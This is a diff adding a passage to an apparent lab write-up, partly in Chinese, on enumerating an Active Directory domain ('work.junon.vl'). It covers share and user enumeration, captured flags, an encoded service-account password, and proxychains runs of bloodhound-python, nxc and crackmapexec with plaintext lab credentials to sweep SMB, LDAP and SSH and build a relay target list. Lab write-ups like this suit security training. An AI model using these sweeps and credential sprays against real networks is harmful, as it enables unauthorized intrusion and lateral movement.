@@ -313,3 +313,292 @@ S021M010
 
 ---
 
+# <span style="color:lightblue">Domain Enumeration from Windows</span>
+
+```powershell
+C:\Users\Hazel.Simpson>whoami
+work-junon\hazel.simpson
+
+C:\Users\Hazel.Simpson>hostname
+S021M010
+
+C:\Users\Hazel.Simpson>ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 172.16.21.180
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.21.1
+
+C:\Users\Hazel.Simpson>whoami /all
+
+USER INFORMATION
+----------------
+
+User Name                SID
+======================== ==============================================
+work-junon\hazel.simpson S-1-5-21-1112787665-3955584987-2510362858-1398
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes
+========================================== ================ ============================================== ==================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
+WORK-JUNON\remote                          Group            S-1-5-21-1112787665-3955584987-2510362858-1362 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+
+C:\Users\Hazel.Simpson>echo %LOGONSERVER%
+\\S021M005
+
+C:\Users\Hazel.Simpson>net user hazel.simpson /domain
+The request will be processed at a domain controller for domain work.junon.vl.
+
+User name                    Hazel.Simpson
+Full Name                    Hazel Simpson
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            4/4/2023 10:33:58 AM
+Password expires             Never
+Password changeable          4/5/2023 10:33:58 AM
+Password required            No
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory               \\S021M015\homes\Hazel.Simpson
+Last logon                   11/3/2023 4:08:41 AM
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users         *remote
+The command completed successfully.
+
+
+Home directory               \\S021M015\homes\Hazel.Simpson
+
+域用户的目录 被分配在域内的另外一台服务器上S021M015
+```
+
+![](/assets/post_img/2023-11-03%20190506_Wutai_domainuser_home_dir.png)
+
+```
+flag1
+\\S021M015\homes\Amy.Ball\flag.txt
+VL{3387261d92644002942061cfea267da2}
+```
+![](/assets/post_img/2023-11-03%20190801_Wutai_flag1_AmyBallhomedir.png)
+
+```
+所有目录域用户均有完全控制权限
+```
+
+```
+flag2
+C:\>type user.txt
+VL{f8ac47197978c087b4b882e84fbdc328}
+```
+
+```
+\\S021M015\manageengine\config
+
+<securepass>
+    <username>svc_me</password>
+    <password>SP81274145f4a5857b839ee7b500f1d66e8a044d12211781b515e7bae67bb7abce</password>
+</securepass>
+```
+
+```
+隐藏目录
+
+C:\>net view \\S021M015 /all
+Shared resources at \\S021M015
+
+
+
+Share name              Type  Used as  Comment
+
+-------------------------------------------------------------------------------
+ADMIN$                  Disk           Remote Admin
+C$                      Disk           Default share
+finance$                Disk
+homes                   Disk           user home directories
+install$                Disk
+IPC$                    IPC            Remote IPC
+it                      Disk
+manageengine            Disk
+transfer                Disk
+UpdateServicesPackages  Disk           A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
+WsusContent             Disk           A network share to be used by Local Publishing to place published content on this WSUS system.
+WSUSTemp                Disk           A network share used by Local Publishing from a Remote WSUS Console Instance.
+The command completed successfully.
+
+install$    
+finance$    nothing
+
+C:\>\\S021M015\install$\SecurePass.exe
+Usage: \\S021M015\install$\SecurePass.exe -p <password>
+
+C:\>\\S021M015\install$\SecurePass.exe -p test
+SPf60eaec0a7d02c3f7f897b21afb7f6e39fb635d01ca5f5339dcd0a8eeaf90a0d
+
+C:\>\\S021M015\install$\SecurePass.exe -p test1
+SPfc073fbf3c7d7d607e815379a5fc5658014e99d1cc406f1e8177347737bb15b0
+
+存在一个二进制文件,后续可进行逆向
+```
+
+```
+机器还存在wsl 但是我们没权限访问
+
+机器iis目录可写 可提权
+```
+```
+C:\Users>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 44D3-B01E
+
+ Directory of C:\Users
+
+11/03/2023  03:31 AM    <DIR>          .
+04/08/2023  12:34 AM    <DIR>          .NET v2.0
+04/08/2023  12:34 AM    <DIR>          .NET v2.0 Classic
+04/08/2023  12:34 AM    <DIR>          .NET v4.5
+04/08/2023  12:34 AM    <DIR>          .NET v4.5 Classic
+04/07/2023  05:14 AM    <DIR>          Administrator
+07/15/2023  01:37 AM    <DIR>          administrator.WORK-JUNON
+04/08/2023  12:34 AM    <DIR>          Classic .NET AppPool
+07/18/2023  12:14 AM    <DIR>          dom-fstewart
+11/03/2023  02:44 AM    <DIR>          Hazel.Simpson
+04/07/2023  03:36 AM    <DIR>          Public
+11/03/2023  03:32 AM    <DIR>          Terry.Lowe
+03/26/2023  01:33 AM    <DIR>          vdi_user
+
+域管登陆过 administrator.WORK-JUNON
+
+
+还有一个vdi_user目录 可疑
+```
+```
+C:\ProgramData>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 44D3-B01E
+
+ Directory of C:\ProgramData
+
+04/04/2023  01:11 PM    <DIR>          Avira
+
+机器存在av 小红伞以及defender
+```
+```
+PS C:\> [System.Net.WebProxy]::GetDefaultProxy()
+
+
+Address               : http://172.16.21.50:8080/
+BypassProxyOnLocal    : False
+BypassList            : {^(?:.*://)?htmd\.com(?::[0-9]{1,5})?$, ^(?:.*://)?microsoft\.com\.(?::[0-9]{1,5})?$}
+Credentials           :
+UseDefaultCredentials : False
+BypassArrayList       : {^(?:.*://)?htmd\.com(?::[0-9]{1,5})?$, ^(?:.*://)?microsoft\.com\.(?::[0-9]{1,5})?$}
+```
+# <span style="color:lightblue">Domain Enumeration from Linux</span>
+
+## <span style="color:lightgreen">bloodhound-python</span>
+
+```bash
+ proxychains4 -q bloodhound-python -c all --disable-pooling -w 1 -u "Terry.Lowe" -p 'Summer2023' -d work.junon.vl -dc dc.work.junon.vl -ns 172.16.21.200 --dns-tcp --zip
+INFO: Found AD domain: work.junon.vl
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+INFO: Connecting to LDAP server: dc.work.junon.vl
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 4 computers
+INFO: Connecting to LDAP server: dc.work.junon.vl
+INFO: Found 312 users
+INFO: Found 61 groups
+INFO: Found 5 gpos
+INFO: Found 9 ous
+INFO: Found 19 containers
+INFO: Found 1 trusts
+INFO: Starting computer enumeration with 1 workers
+INFO: Querying computer: S021W105.work.junon.vl
+INFO: Querying computer: S021M015.work.junon.vl
+INFO: Querying computer: S021M010.work.junon.vl
+INFO: Querying computer: S021M005.work.junon.vl
+INFO: Done in 01M 47S
+INFO: Compressing output into 20231103072820_bloodhound.zip
+```
+
+## <span style="color:lightgreen">other</span>
+
+```bash
+proxychains4 -q ./nxc smb 172.16.21.3-254 -u "Terry.Lowe" -p 'Summer2023' --shares
+```
+
+```bash
+proxychains4 -q ./nxc smb 172.16.21.3-254 --gen-relay-list relay.txt
+SMB         172.16.21.180   445    S021M010         [*] Windows 10.0 Build 20348 x64 (name:S021M010) (domain:work.junon.vl) (signing:False) (SMBv1:False)
+SMB         172.16.21.200   445    S021M005         [*] Windows 10.0 Build 20348 x64 (name:S021M005) (domain:work.junon.vl) (signing:True) (SMBv1:False)
+SMB         172.16.21.222   445    S021M200         [*] Windows 10.0 Build 20348 x64 (name:S021M200) (domain:eu.junon.vl) (signing:True) (SMBv1:False)
+SMB         172.16.21.195   445    S021M015         [*] Windows 10.0 Build 20348 x64 (name:S021M015) (domain:work.junon.vl) (signing:False) (SMBv1:False)
+```
+
+```
+proxychains4 -q ./nxc  crackmapexec 172.16.21.200 -u "Terry.Lowe" -p 'Summer2023' -M map
+proxychains4 -q ./nxc  ldap 172.16.21.200 -u "Terry.Lowe" -p 'Summer2023' -M map
+
+proxychains4 -q crackmapexec ldap 172.16.21.200 -u "Terry.Lowe" -p 'Summer2023' -M adcs
+nothing
+
+proxychains4 -q crackmapexec ssh 172.16.21.3-254 -u "Terry.Lowe" -p 'Summer2023' --continue-on-success
+
+默认情况下如果linux加入域 所有域用户均可登录
+```
+
+---
+
+# <span style="color:lightblue">Writing a Loader</span>
+
+# <span style="color:lightblue">Getting a Beacon</span>
+
+
+
+
+## <span style="color:lightgreen"></span>
